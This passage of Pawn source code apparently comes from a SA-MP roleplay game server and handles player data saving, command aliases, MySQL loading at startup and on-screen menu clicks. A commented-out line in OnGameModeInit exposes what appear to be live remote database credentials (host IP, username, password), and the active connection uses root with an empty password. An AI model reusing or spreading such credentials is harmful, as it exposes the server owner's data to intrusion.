		format(gString, 128, "{A9C4E4}(Group) {FFFFFF}%s from your group has desconnected. (%s)", GetName(playerid), left_reson[reason]);
	    SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_WHITE, gString);
	}	
	format(gString, 128, "%s has left the server. (%s).", GetNameEx(playerid), left_reson[reason]);
	ProxDetector(20.0, playerid, gString, COLOR_CLIENT); 
	Iter_Clear(StreamedPlayer[playerid]);
    return true;
}

OnPlayerLeftQuery(playerid) {
	new y,m,d,h,mi,s; getdate(y,m,d); gettime(h,mi,s);
	gString[0] = (EOS);
	mysql_format(SQL, gString, sizeof gString, "UPDATE `users` SET `Money`='%s', `goal` = '%i', `DailyActivity` = '%i', `Jailed`='%i',`Muted`='%i',`MuteTime`='%i', \
		`Respect` = '%i', `GoldPoints` = '%i', `WantedTime` = '%i', `Status` = '-1', `job_skills_points` = '%i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i', `NewbieMute`='%i', `FPunish`='%i', `ConnectedTime`='%0.3f', `Acceptpoints`='%i', `Seconds` = '%f', `JailTime` = '%i', `GiftPoints` = '%i', `BPoints` = '%i', `CasinoCredit` = '%i', `ClanMoney` = '%i', `Credit` = '%i', `lastOn`='%02d.%02d.%d %02d:%02d' WHERE `id` = '%i'", 
		valueBigInt(money[playerid]), PlayerInfo[playerid][pJobGoal], PlayerInfo[playerid][pDailyActivity], PlayerInfo[playerid][pJailed], PlayerInfo[playerid][pMuted], PlayerInfo[playerid][pMuteTime], 
		PlayerInfo[playerid][pExp], PlayerInfo[playerid][pPremiumPoints], WantedTime[playerid], PlayerInfo[playerid][pJobSkillPoints][0], PlayerInfo[playerid][pJobSkillPoints][1], PlayerInfo[playerid][pJobSkillPoints][2], PlayerInfo[playerid][pJobSkillPoints][3],
		PlayerInfo[playerid][pJobSkillPoints][4], PlayerInfo[playerid][pJobSkillPoints][5], PlayerInfo[playerid][pJobSkillPoints][6], PlayerInfo[playerid][pJobSkillPoints][7],
		PlayerInfo[playerid][pJobSkillPoints][8], PlayerInfo[playerid][pJobSkillPoints][9], PlayerInfo[playerid][pJobSkillPoints][10], PlayerInfo[playerid][pJobSkillPoints][11],
		PlayerInfo[playerid][pJobSkillPoints][12], PlayerInfo[playerid][pJobSkillPoints][13], PlayerInfo[playerid][pJobSkillPoints][14], PlayerInfo[playerid][pJobSkillPoints][15],
		PlayerInfo[playerid][pJobSkillPoints][16], PlayerInfo[playerid][pNewbieMute], PlayerInfo[playerid][pFpunish], PlayerInfo[playerid][pConnectTime], PlayerInfo[playerid][pLawyer], 
		PlayerInfo[playerid][pSeconds], PlayerInfo[playerid][pJailTime], PlayerInfo[playerid][pGiftPoints], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pCasinoCredit], PlayerInfo[playerid][pClanMoney], PlayerInfo[playerid][pCredit], d,m,y,h,mi, PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gString);
}

cmd:o(playerid, params[]) 				return callcmd::anno(playerid, params);
cmd:gotoveh(playerid, params[]) 		return callcmd::gotocar(playerid, params);
cmd:getveh(playerid, params[]) 			return callcmd::getcar(playerid, params);
cmd:leavepaint(playerid, params[]) 		return callcmd::paintleave(playerid, params);
cmd:da(playerid, params[]) 				return callcmd::deletead(playerid,params);
cmd:unrentbike(playerid, params[]) 		return callcmd::unrentcar(playerid, params);
cmd:nd(playerid, params[]) 				return callcmd::ndelete(playerid, params);
cmd:clanmotd(playerid, params[]) 		return callcmd::cmotd(playerid, params);
cmd:carmusic(playerid, params[])		return callcmd::carradio(playerid, params);
cmd:gov(playerid, params[]) 			return callcmd::government(playerid, params);
cmd:m(playerid, params[]) 				return callcmd::megaphone(playerid, params);
cmd:r(playerid, params[]) 				return callcmd::radio(playerid, params);
cmd:d(playerid, params[]) 				return callcmd::departments(playerid, params);
cmd:su(playerid, params[]) 				return callcmd::suspect(playerid, params);
cmd:bmenu(playerid, params[])		 	return callcmd::bizmenu(playerid, params);
cmd:hmenu(playerid, params[]) 			return callcmd::housemenu(playerid, params);
cmd:fvr(playerid, params[]) 			return callcmd::fvrespawn(playerid, params);
cmd:cr(playerid, params[]) 				return callcmd::closereport(playerid, params);
cmd:n(playerid, params[]) 				return callcmd::newbie(playerid, params);
cmd:set(playerid, params[]) 			return callcmd::setstat(playerid, params);
cmd:fv(playerid, params[]) 				return callcmd::fixveh(playerid, params);
cmd:gps(playerid, params[]) 			return callcmd::locations(playerid, params);
cmd:vehname(playerid, params[]) 		return callcmd::vsearch(playerid, params);
cmd:h(playerid) 						return callcmd::hangup(playerid);
cmd:jail(playerid, params[]) 			return callcmd::ajail(playerid, params);
cmd:w(playerid, params[]) 				return callcmd::whisper(playerid, params);
cmd:shout(playerid, params[]) 			return callcmd::s(playerid, params);
cmd:ashout(playerid, params[]) 			return callcmd::as(playerid, params);
cmd:work(playerid, params[])	 		return callcmd::startwork(playerid, params);
cmd:c(playerid, params[]) 				return callcmd::clanchat(playerid, params);
cmd:ph(playerid, params[]) 				return callcmd::puthelmet(playerid, params);
cmd:unstuck(playerid, params[]) 		return callcmd::stopanim(playerid, params);
cmd:ta(playerid, params[]) 				return callcmd::tazer(playerid, params);

cmd:spawn(playerid, params[]) 			return callcmd::respawn(playerid, params);
cmd:myreferrals(playerid, params[]) 	return callcmd::referal(playerid, params);
cmd:pet(playerid, params[]) 			return callcmd::petmenu(playerid, params);
cmd:show(playerid, params[]) 			return callcmd::hud(playerid, params);
cmd:email(playerid, params[]) 			return callcmd::emails(playerid, params);
cmd:realizari(playerid, params[]) 		return callcmd::achivemets(playerid, params);
cmd:skins(playerid, params[]) 			return callcmd::myskins(playerid, params);

#define SERVER_HOST 0

public OnGameModeInit() {
	DisableCrashDetectLongCall();

	//if(SERVER_HOST) SQL = mysql_connect("93.115.101.23", "u340_0hGmrCnhJR", "UNp@sJKEFxTFKydTAUMjWzmW", "s340_mrx");
	SQL = mysql_connect("127.0.0.1", "root","", "b-hood");

	mysql_tquery(SQL, "SELECT * FROM users", "TotalUsers", "");
	mysql_tquery(SQL, "SELECT * FROM `svehicles` ORDER BY `svehicles`.`vID` ASC", "LoadSVehicle", "");
	mysql_tquery(SQL, "SELECT * FROM `turfs`", "SQL_loadTurfs", "");
	mysql_tquery(SQL, "SELECT * FROM `safezones` ORDER BY `safezones`.`ID` ASC", "InsertSafeZone", "");
	mysql_tquery(SQL, "SELECT * FROM `houses` ORDER BY `houses`.`ID` ASC", "LoadProperty", ""); 
	mysql_tquery(SQL, "SELECT * FROM `bizz` ORDER BY `bizz`.`ID` ASC", "LoadBizz", "");
	mysql_tquery(SQL, "SELECT * FROM `clans` ORDER BY `clans`.`ID` ASC", "InsertClans", "");
	mysql_tquery(SQL, "SELECT * FROM `clanhq`", "LoadHQClans", "");
	mysql_tquery(SQL, "SELECT * FROM `graffiti`", "LoadGraffiti", "");
	mysql_tquery(SQL, "SELECT * FROM `factions`", "LoadFactions", "");
	mysql_tquery(SQL, "SELECT * FROM `garages`", "sql_load_garages");
	mysql_tquery(SQL, "SELECT * FROM `eat_stand`", "sql_load_eat_stand");
	mysql_tquery(SQL, "SELECT * FROM `jobs` ORDER BY `jobs`.`ID` ASC", "LoadJobs", "");
	mysql_tquery(SQL, "SELECT * FROM `dsveh` WHERE `Price` > '0' ORDER BY `dsveh`.`Price` ASC", "LoadDSVeh", ""); 
	mysql_tquery(SQL, "SELECT * FROM `seif`", "LoadSafes", "");
	mysql_tquery(SQL, "SELECT * FROM `atm`", "SQL_cache_atm");
	mysql_tquery(SQL, "SELECT * FROM `commands`", "SQL_blockcommands");
	mysql_tquery(SQL, "UPDATE `users` SET `Status` = '-1'");
	mysql_tquery(SQL, "SELECT * FROM `svf` WHERE `Rank` > '0' ORDER BY `svf`.`Rank` ASC", "SQL_Load_Svf");
	mysql_tquery(SQL, "SELECT * FROM `stuff` WHERE `ID` = '1'", "SQL_load_battlepass", "");
	mysql_tquery(SQL, "SELECT * FROM `stuff` WHERE `ID` = '1'", "LoadStuffs", "");

    Float_payday = false;
    Iter_Init(VehicleKeys);
    Iter_Init(PlayerKeys);
    Iter_Init(player_in_blocks);
	Iter_Init(server_Vehicles);

	new f=-1;
	while(++f<MAX_SKINS) PlayerInfo[MAX_PLAYERS][pSkins][f]=-1; f=-1;
	while(++f<MAX_CRATES) PlayerInfo[MAX_PLAYERS][pCrates][f]=0; f=-1; 
	while(++f<MAX_VOUCHERS) PlayerInfo[MAX_PLAYERS][pVoucher][f]=0; f=-1; 
	while(++f<MAX_TICKETS) PlayerInfo[MAX_PLAYERS][pTickets][f]=0; f=-1; 
	

    #define MAX_INVALID_NOS_VEHICLES 52
    new InvalidNosVehicles[MAX_INVALID_NOS_VEHICLES] =
    {
        581,523,462,521,463,522,461,448,468,586,417,425,469,487,512,520,563,593,
        509,481,510,472,473,493,520,595,484,430,453,432,476,497,513,533,577,
        452,446,447,454,590,569,537,538,570,449,519,460,488,511,519,548,592
    };
	
    for(new i=0;i<MAX_INVALID_NOS_VEHICLES;i++) Iter_Add(IsValidNos, InvalidNosVehicles[i]);
	for(new i=0,act_id;i<sizeof rob_actor_pos;i++) {
		act_id = CreateDynamicActor(72, rob_actor_pos[i][0], rob_actor_pos[i][1], rob_actor_pos[i][2], rob_actor_pos[i][3]);
		ApplyDynamicActorAnimation(act_id, "COP_AMBIENT", "Coplook_loop", 4.0, 0, 1, 1, 1, -1);
		CreateDynamic3DTextLabel("Wembley (69)", -1, rob_actor_pos[i][0], rob_actor_pos[i][1], rob_actor_pos[i][2]+1.1, 10.0);
	}

	static const
		Float: _j_Act[6] = {
		2168.16553,
		2175.19922,
		2182.74585,
		2206.20850,
		2212.35938,
		2221.56616
	};
	for(new i=0;i<6;i++) {
		bl_actor[i] = CreateDynamicActor(171, _j_Act[i], 1630.66833, 1008.36780, 180.0,1,100.0, 3, 1);
		format(gString, 128, "{FFFFFF}Table #%d\nPlayers: 0/7\nBet: {029913}$%s - $%s\n{FFDD00}Waiting for players", i+1, FormatNumber(_jack_bet_[i/2][0]), FormatNumber(_jack_bet_[i/2][1]));
		bl_label[i] = CreateDynamic3DTextLabel(gString, 0xFFFFFFAA, _j_Act[i], 1630.66833, 1008.36780, 30.0);
	}

	new Year, Month, Day, Hour, Minute, Second;
	getdate(Year, Month, Day);
	gettime(Hour, Minute, Second);
	format(StartDate, sizeof(StartDate), "RO:RPG, %02d.%02d (%02d:%02d)", Day, Month, Hour, Minute);
	SetGameModeText(StartDate);

	LoadMaps();
	LoadTDs();
	load_bl();
	LoadIcons();
	LoadGates();
	LoadRouletta();
	AntiDeAMX();

	skinlist = LoadModelSelectionMenu("skins.txt");
	hats = LoadModelSelectionMenu("hats.txt");
	glasses = LoadModelSelectionMenu("glasses.txt");

	if(realtime) {
		new tmphour, tmpminute, tmpsecond;
		gettime(tmphour, tmpminute, tmpsecond);
		FixHour(tmphour);
		tmphour = shifthour;
		new worldt = tmphour+1;
		SetWorldTimeEx(worldt);
	}	
	
	gettime(ghour, gminute, gsecond);
	FixHour(ghour);
	ghour = shifthour;
	if(!realtime) SetWorldTimeEx(wotime);
    DisableInteriorEnterExits();
	AllowInteriorWeapons(1);
	UsePlayerPedAnims();
	EnableStuntBonusForAll(0);
	ShowPlayerMarkers(2);
	ManualVehicleEngineAndLights();
	return true;
}

redist::sql_load_eat_stand() {
	sql_eatstand = cache_num_rows();
	printf("[MySQL]\t\t\teat stands\t\t%d", sql_eatstand);
	if(!sql_eatstand) return true;
	for(new i=0;i!=sql_eatstand;i++) {
		cache_get_value_name_int(i, "ID", standInfo[i][_sID]);
		cache_get_value_name_float(i, "X", standInfo[i][_sX]);
		cache_get_value_name_float(i, "Y", standInfo[i][_sY]);
		cache_get_value_name_float(i, "Z", standInfo[i][_sZ]);
		cache_get_value_name_float(i, "Rot", standInfo[i][_sRot]);

		format(gString, 128, "{32A852}Eat Stand #%d\n{FFFFFF}Price: {32A852}$5,000\n{FFFFFF}Use ({32A852}/eat{FFFFFF}) to eat it", standInfo[i][_sID]);
		CreateDynamic3DTextLabel(gString, -1, standInfo[i][_sX], standInfo[i][_sY], standInfo[i][_sZ], 20.0);
		CreateDynamicObject(1342, standInfo[i][_sX], standInfo[i][_sY], standInfo[i][_sZ], 0.0, 0.0, standInfo[i][_sRot]);
	}
	return true;
}

redist::SQL_blockcommands() {
	printf("[MySQL]\t\t\tcommands blocked\t%d", cache_num_rows());
	if !cache_num_rows() *then
		return true;

	new i=-1, string:command[32];
	while(++i<cache_num_rows()) {
		cache_get_value_name(0, "name", command);
		PC_SetFlags(command, true);
	}
	return true;
}

public OnPlayerClickTextDraw(playerid, Text:clickedid) {
	gString[0] = EOS;
	new td=-1;
	if(clickedid == Text:INVALID_TEXT_DRAW) {
		switch(player_selected[playerid]) {
			case 1: {
				if(IsPin[playerid] == 2) SelectTextDraw(playerid, 0xFF5B5BFF);
				else {
					for(new i=1;i<11;i++) {
						PlayerTextDrawSetString(playerid, PinPTD[i], e_Nums[i-1]);
						PlayerTextDrawColor(playerid, PinPTD[i], -1);
						PlayerTextDrawHide(playerid, PinPTD[i]); 
					}
					PlayerTextDrawHide(playerid, PinPTD[0]);
					for(new i=0;i<8;i++) TextDrawHideForPlayer(playerid, PinTD[i]);
					player_selected[playerid] = 0;
					CancelSelectTextDraw(playerid);
					PinInsert[playerid] = "";
					PlayerTextDrawSetString(playerid, PinPTD[0], "----");
					IsPin[playerid] = 0;
				}
			}
			case 2: {
				SkinsActions[playerid] = 0;
				player_selected[playerid] = 0;
	        	CancelSelectTextDraw(playerid);
	        	for(new i=0;i<11;i++) PlayerTextDrawHide(playerid, SkinsPTD[i]);
				for(new i=0;i<11;i++) TextDrawHideForPlayer(playerid, SkinsTD[i]);
			}
			case 3: {
				CancelSelectTextDraw(playerid);
				HideDealershipTextdraws(playerid);
				SetCameraBehindPlayer(playerid);
				TogglePlayerControllable(playerid, 1);
				SetPlayerVirtualWorld(playerid, 0);
				SetPlayerInterior(playerid, 0);
				DestroyVehicleEx(DealerCar[playerid], "");
				DealerID[playerid] = -1;
				DealerCar[playerid] = 0;
				player_selected[playerid] = 0;
			}
			case 4: return SelectTextDraw(playerid, COLOR_WHITE);
			case 5: return SelectTextDraw(playerid, COLOR_SERVER);
			case 6: return SelectTextDraw(playerid, COLOR_LGREEN);
			case 7: {
				if(CrateTime[playerid]) SelectTextDraw(playerid, COLOR_LIGHTBLUE);
				else {
					player_selected[playerid]=0;
					for(new j = 0; j < 4; j++) TextDrawHideForPlayer(playerid, CrateTD[j]);
					for(new j = 0; j < 2; j++) PlayerTextDrawDestroy(playerid, CratePTD[playerid][j]);
					CancelSelectTextDraw(playerid);
				}
			}
			case 8: return HideShopTDs(playerid);
			case 9: {
				for(new i=0;i<3;i++) TextDrawHideForPlayer(playerid, GunTD[i]);
				PlayerTextDrawHide(playerid, GunPTD);
				player_selected[playerid] = 0;
				CancelSelectTextDraw(playerid);
				GunID[playerid] = 0;
				DestroyPlayerObject(playerid, GunObject[playerid]);
				TogglePlayerControllable(playerid, 1);
				TogglePlayerSpectating(playerid, 0);
				SetCameraBehindPlayer(playerid);
			}
			case 10: return SelectTextDraw(playerid, COLOR_WHITE);
			case 14: {
				if(TradeID[playerid] == -1) return true;
				new id = TradeID[playerid];
				format(gString, 50, "* %s a inchis meniul!", GetName(playerid));
				SendClientMessage(playerid, COLOR_GOLD, gString);
				SendClientMessage(id, COLOR_GOLD, gString);
				DestroyTradeItems(playerid);
				DestroyTradeItems(id);
				CancelSelectTextDraw(playerid);
				CancelSelectTextDraw(id); 
			}
			case 15: {
				new g = inGarage[playerid];
				for(new t=0;t<5;t++) TextDrawHideForPlayer(playerid, GarageTD[t]);
				PlayerTextDrawHide(playerid, GaragePTD);
				CancelSelectTextDraw(playerid);
				inGarage[playerid] = -1;
				player_selected[playerid] = 0;
				SetCameraBehindPlayer(playerid);
				SetPlayerPos(playerid, GarageInfo[g][gEnterX], GarageInfo[g][gEnterY], GarageInfo[g][gEnterZ]);		
				SetPlayerVirtualWorld(playerid, 0);		
				return true;
			}
			case 16: {
				CancelSelectTextDraw(playerid);
				player_selected[playerid] = 0;
				for(new i=1;i<=4;i++) {
					PlayerTextDrawHide(playerid, ShardPTD[i]);
					TextDrawHideForPlayer(playerid, ShardTD[i-1]);
				}
				PlayerTextDrawHide(playerid, ShardPTD[0]);
				return true;
			}
			case 17: {
				CancelSelectTextDraw(playerid);
				player_selected[playerid] = 0;
				for(new i=0;i<2;i++) TextDrawHideForPlayer(playerid, RaceTD[i]), PlayerTextDrawHide(playerid, RacePTD[i]);
				TextDrawHideForPlayer(playerid, RaceTD[2]);
				SetCameraBehindPlayer(playerid);
				Iter_Remove(race_players, playerid);
				SetPlayerVirtualWorld(playerid, 0);
				new idd=BizzTypeID[16][0];
				SetPlayerPos(playerid, BizzInfo[idd][bEntranceX]+random(3), BizzInfo[idd][bEntranceY]+random(3), BizzInfo[idd][bEntranceZ]);
				if(raceVoted[playerid][0]!=-1) race_map_votes[raceVoted[playerid][0]] --;
				raceVoted[playerid][1] = false;
				return true;
			}
			case 18: return stopWork(playerid);
			case 19: {
				new slot = bl_slot_id[playerid][1];
				if bl_status[slot]!=BL_WAITING *then
					return SelectTextDraw(playerid, 0x8F9900FF);

				bl_hide_player(playerid);
			}
			case 20: return HideRoulette(playerid);
			case 21: {
				if(machine_in_progress[playerid]) return SelectTextDraw(playerid, 0xA9D549FF);
				td=-1;
				while(++td<47) PlayerTextDrawDestroy(playerid, machine_TD[playerid][td]);
				CancelSelectTextDraw(playerid);
				player_selected[playerid] = 0;
				SetCameraBehindPlayer(playerid);
			}
			case 22: { 
				td=1;
				while(++td<22) PlayerTextDrawShow(playerid, machine_TD[playerid][td]); --td;
				while(++td<36) PlayerTextDrawHide(playerid, machine_TD[playerid][td]);
				player_selected[playerid] = 21;
				SelectTextDraw(playerid, 0xA9D549FF);
				return true;
			}
			case 23: {
				if(machine_in_progress[playerid]) return true;
				resetCardMachine(playerid);
			}
			case 24: {
				HideAccsTextdraws(playerid);
				player_selected[playerid] = 0;
			}
			default: return true;
		}
		return true;
	}
	switch player_selected[playerid] do {
		case 1: {
			switch TextID[Text:clickedid] do {
				case 0: {
					if(!strlen(PinInsert[playerid])) return true;
					PlayerTextDrawSetString(playerid, PinPTD[0], "----");
					PinInsert[playerid] = "";
					for(new i=1;i<11;i++) {
						PlayerTextDrawSetString(playerid, PinPTD[i], e_Nums[i-1]);
						PlayerTextDrawColor(playerid, PinPTD[i], -1);
						PlayerTextDrawShow(playerid, PinPTD[i]);
					}
					return true;
				}
				case 1: {
					if(strlen(PinInsert[playerid]) < 4) return true;
					switch(IsPin[playerid]) {
						case 1: {	
							PlayerInfo[playerid][pPin] = strval(PinInsert[playerid]);
							SCMf(playerid, 0xFFA500FF, "Codul tau pin este {f1f442}%d{FFA500}. (( fa o poza pentru a nu uita codul pin la contul tau! ))", PlayerInfo[playerid][pPin]);
							PlayerInfo[playerid][pPinLogged] = 1;
							UpdateVar(playerid, "Pin", PlayerInfo[playerid][pPin]);
						}
						case 2: {
							if(PlayerInfo[playerid][pPin] == strval(PinInsert[playerid])) {
								PlayerInfo[playerid][pPinLogged] = 1;	
								SendClientMessage(playerid, COLOR_YELLOW, "Felicitari! Codul PIN introdus de tine este unul valid, acum beneficiezi de acces la contul tau.");
							}
							else {
								SendClientMessage(playerid, COLOR_WARNING, "Codul PIN introdus este invalid.");
								PlayerTextDrawSetString(playerid, PinPTD[0], "----");
								PinInsert[playerid] = "";	
								for(new i = 0; i < 10; i++) PlayerTextDrawColor(playerid, PinPTD[i], -1), PlayerTextDrawShow(playerid, PinPTD[i]);							
								return true;
							}
						}
					}
					IsPin[playerid] = 0;	
					for(new i=0;i<11;i++) PlayerTextDrawHide(playerid, PinPTD[i]);
					for(new i=0;i<8;i++) TextDrawHideForPlayer(playerid, PinTD[i]);
					CancelSelectTextDraw(playerid);
					PinInsert[playerid] = "";
					PlayerTextDrawSetString(playerid, PinPTD[0], "----");
					player_selected[playerid] = 0;
					return true;
				}
			}
		}
		case 2: {
			switch TextID[Text:clickedid] do {
				case 0: {
					SkinsActions[playerid] = 0;
			        CancelSelectTextDraw(playerid);
			        for(new i=0;i<11;i++) PlayerTextDrawHide(playerid, SkinsPTD[i]);
					for(new i=0;i<11;i++) TextDrawHideForPlayer(playerid, SkinsTD[i]);
				}
				case 1: SkinsActions[playerid] = 1, SendClientMessage(playerid, COLOR_GREY, "Orice skin vei selecta il vei pune pe tine.");
				case 2: SkinsActions[playerid] = 2, SendClientMessage(playerid, COLOR_GREY, "Orice skin vei selecta il vei sterge.");
				case 3: {
					if(td_page[playerid]<=1) return true;

					td_page[playerid]--;
					for(new i=0,x;i<10;i++) {
						x=i+((td_page[playerid]-1)*10);
						PlayerTextDrawSetPreviewModel(playerid, SkinsPTD[i], PlayerInfo[playerid][pSkins][x] != -1?PlayerInfo[playerid][pSkins][x]:18631);
						PlayerTextDrawBackgroundColor(playerid, SkinsPTD[i], GetSkinRareCMD(PlayerInfo[playerid][pSkins][x]));
						PlayerTextDrawShow(playerid, SkinsPTD[i]);
					}
					format(gString, 30, "%d/%d", td_page[playerid], PlayerInfo[playerid][pVip]+1);
					PlayerTextDrawSetString(playerid, SkinsPTD[10], gString);
				}
				case 4: {
					if(td_page[playerid]>=PlayerInfo[playerid][pVip]+1) return true;

					td_page[playerid]++;
					for(new i=0,x;i<10;i++) {
						x=i+((td_page[playerid]-1)*10);
						PlayerTextDrawSetPreviewModel(playerid, SkinsPTD[i], PlayerInfo[playerid][pSkins][x] != -1?PlayerInfo[playerid][pSkins][x]:18631);
						PlayerTextDrawBackgroundColor(playerid, SkinsPTD[i], GetSkinRareCMD(PlayerInfo[playerid][pSkins][x]));
						PlayerTextDrawShow(playerid, SkinsPTD[i]);
					}
					format(gString, 30, "%d/%d", td_page[playerid], PlayerInfo[playerid][pVip]+1);
					PlayerTextDrawSetString(playerid, SkinsPTD[10], gString);
				}
			}
			return true;
		}
		case 3: {
			switch TextID[Text:clickedid] do {
				case 0: {
					if(GetPlayerCash(playerid) < DSModels[DealerID[playerid]][dPrice]) return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficienti bani pentru a cumpara aceasta masina.");
					if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai numarul maxim de masini personale!"); 		
					if(DSModels[DealerID[playerid]][dStock] < 1 && PlayerInfo[playerid][pTickets][4] < 1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest vehicul nu mai este in stock.");
					gQuery[0] = EOS;
					mysql_format(SQL, gQuery, 128, "INSERT INTO cars (Model) VALUES (%d)", DSModels[DealerID[playerid]][dModel]);
					mysql_tquery(SQL, gQuery, "InsertDsCars", "ii", playerid, DSModels[DealerID[playerid]][dModel]);

					if(DSModels[DealerID[playerid]][dStock] < 1 && PlayerInfo[playerid][pTickets][4]) {
						PlayerInfo[playerid][pTickets][4]--,save_tickete(playerid);
						SCMf(playerid, -1, "{FF0000}>> {FFFFFF}SWS Voucher: -1, total: %d", PlayerInfo[playerid][pTickets][4]);
					}
					else {
						DSModels[DealerID[playerid]][dStock] --;
						mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `dsveh` SET `Stock`='%d' WHERE `ID`='%d'", DSModels[DealerID[playerid]][dStock], DSModels[DealerID[playerid]][dID]);
						mysql_tquery(SQL, gQuery, "", "");
					}

					HideDealershipTextdraws(playerid);
					CancelSelectTextDraw(playerid);		
					player_selected[playerid] = 0;
				}
				case 1: {
					SendClientMessage(playerid, COLOR_WHITE, "{EBC334}(Test Drive) {FFFFFF}Ai la dispozitie 2 minute pentru a testa acest vehicul.");
					HideDealershipTextdraws(playerid);
					SetCameraBehindPlayer(playerid);
					player_selected[playerid] = 0;
					TestingModel[playerid] = 120;
					CancelSelectTextDraw(playerid);
					TogglePlayerControllable(playerid, true);
					SetVehiclePosEx(DealerCar[playerid], 2148.7603,-1202.3506,23.4915), SetVehicleZAngleEx(DealerCar[playerid], 1.0487);
					PutPlayerInVehicleEx(playerid, DealerCar[playerid], 0);
				}
				case 2: if(IsAdmin(playerid, 7)) return ShowPlayerDialog(playerid, DIALOG_EDITVEHICLE, DIALOG_STYLE_LIST, "Edit vehicle", "Value\nStock", "Ok", "Exit"), 1;
				case 3: {
				    if(!DealerID[playerid]) DealerID[playerid] = dsvehs;
					DealerID[playerid] --;
					DestroyVehicleEx(DealerCar[playerid], "");
			 		DealerCar[playerid] = CreateVehicleEx(DSModels[DealerID[playerid]][dModel],2128.3125,-1132.6002,25.2857,359.1203,1,1);
					SetVehicleVirtualWorld(DealerCar[playerid],playerid+1);	
					format(gString, 128, "Name: ~y~%s~n~~w~~h~max. speed ~y~%d ~w~~h~km/h~n~~w~~h~Price: %s$%s~n~~w~~h~Stock: ~y~%d", aVehicleNames[GetVehicleModel(DealerCar[playerid])-400], GetVehicleMaxSpeed(GetVehicleModel(DealerCar[playerid])), GetPlayerCash(playerid) < DSModels[DealerID[playerid]][dPrice] ? ("~r~") : ("~g~"), FormatNumber(DSModels[DealerID[playerid]][dPrice]), DSModels[DealerID[playerid]][dStock]);
					PlayerTextDrawSetString(playerid, InfoDS, gString);
					OnePlayAnim(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				}
				case 4: {
					if(DealerID[playerid] == dsvehs-1) DealerID[playerid] = -1;
			        DealerID[playerid] ++;
					DestroyVehicleEx(DealerCar[playerid], "");
					DealerCar[playerid] = CreateVehicleEx(DSModels[DealerID[playerid]][dModel],2128.3125,-1132.6002,25.2857,359.1203,1,1);
					SetVehicleVirtualWorld(DealerCar[playerid],playerid+1);	
					format(gString, 128, "Name: ~y~%s~n~~w~~h~max. speed ~y~%d ~w~~h~km/h~n~~w~~h~Price: %s$%s~n~~w~~h~Stock: ~y~%d", aVehicleNames[GetVehicleModel(DealerCar[playerid])-400], GetVehicleMaxSpeed(GetVehicleModel(DealerCar[playerid])), GetPlayerCash(playerid) < DSModels[DealerID[playerid]][dPrice] ? ("~r~") : ("~g~"), FormatNumber(DSModels[DealerID[playerid]][dPrice]), DSModels[DealerID[playerid]][dStock]);
					PlayerTextDrawSetString(playerid, InfoDS, gString);
					OnePlayAnim(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				}
			}
		}
		case 5: {
			switch TextID[Text:clickedid] do {
				case 0: {
					if(RegisrationStep[playerid][0] && RegisrationStep[playerid][1] && RegisrationStep[playerid][2] && RegisrationStep[playerid][3]) 
						OnPlayerRegister(playerid,RegisterPass[playerid]);
					else return SendClientMessage(playerid, COLOR_GREY, "Nu te poti inregistra deoarece nu ai completat toate datele!");
					return true;
				}
				case 1: {
					for(new i=0;i<7;i++) PlayerTextDrawDestroy(playerid, RegisterPTD[playerid][i]), PlayerTextID[playerid][PlayerText:RegisterPTD[playerid][i]] = -1;
					player_selected[playerid] = 0;
					CancelSelectTextDraw(playerid);
					for(new i = 0; i < 14; i++) TextDrawHideForPlayer(playerid, RegisterTD[i]);
					Kick(playerid);
					return true;
				}
			}
		}
		case 7: {
			switch TextID[Text:clickedid] do {
				case 0: {
					if(!totalcrates(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai nicio cutie!");
				    if(CrateTime[playerid]) return true;
					for(new j = 0; j < 4; j++) TextDrawHideForPlayer(playerid, CrateTD[j]);
					for(new j = 0; j < 2; j++) PlayerTextDrawDestroy(playerid, CratePTD[playerid][j]);
					gString[0] = EOS;
					strcat(gString, "Crate Type\tAmount\n");
					for(new i=0;i<sizeof(CrateName);i++) format(gQuery, 128, "%s\t{%s}%d\n", CrateName[i][crateList], CrateColors[i], PlayerInfo[playerid][pCrates][i]), strcat(gString, gQuery);
					ShowPlayerDialog(playerid, DIALOG_CRATES, DIALOG_STYLE_TABLIST_HEADERS, "My Crates:", gString, "Select", "Cancel");
				}
				case 1: {
					if(CrateTime[playerid]) return true;
					for(new j = 0; j < 4; j++) TextDrawHideForPlayer(playerid, CrateTD[j]);
					for(new j = 0; j < 2; j++) PlayerTextDrawDestroy(playerid, CratePTD[playerid][j]);
					player_selected[playerid] = 0;
					CancelSelectTextDraw(playerid);
				}
			}
		}
		case 8: {
			switch TextID[Text:clickedid] do {
				case 0: {
					if(SInterior[playerid] == 1) SInterior[playerid] = 38;
					SInterior[playerid] --;
					SetInteriorCamera(playerid);
					return true;
				}
				case 1: {
					if(SInterior[playerid] == 37) SInterior[playerid] = 0;
					SInterior[playerid] ++;
					SetInteriorCamera(playerid);
					SetPlayerVirtualWorld(playerid, pVirtual[playerid]);
					return true;
				}
				case 2: return HideShopTDs(playerid);
			}
		}
		case 9: {
			switch TextID[Text:clickedid] do {
				case 0: {
					GunID[playerid] = !GunID[playerid]?5:GunID[playerid]-1;
					switch GunID[playerid] do {
						case 0: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 348, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "desert eagle~n~~g~$5000");
						}
						case 1: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 356, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "m4~n~~g~$10000");
						}
						case 2: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 355, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
